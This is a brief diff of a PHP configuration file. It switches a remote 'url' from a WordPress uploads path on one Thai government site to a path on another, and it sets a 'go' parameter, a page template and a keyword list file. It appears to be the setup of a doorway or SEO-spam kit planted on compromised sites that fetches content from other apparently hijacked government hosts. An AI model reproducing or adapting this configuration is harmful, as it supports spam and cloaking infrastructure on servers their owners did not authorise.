@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'http://amnat.nfe.go.th/amnat2024/wp-content/uploads/style/',
+        'url'		=> 'https://nsn-dep.moph.go.th/_car/style/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
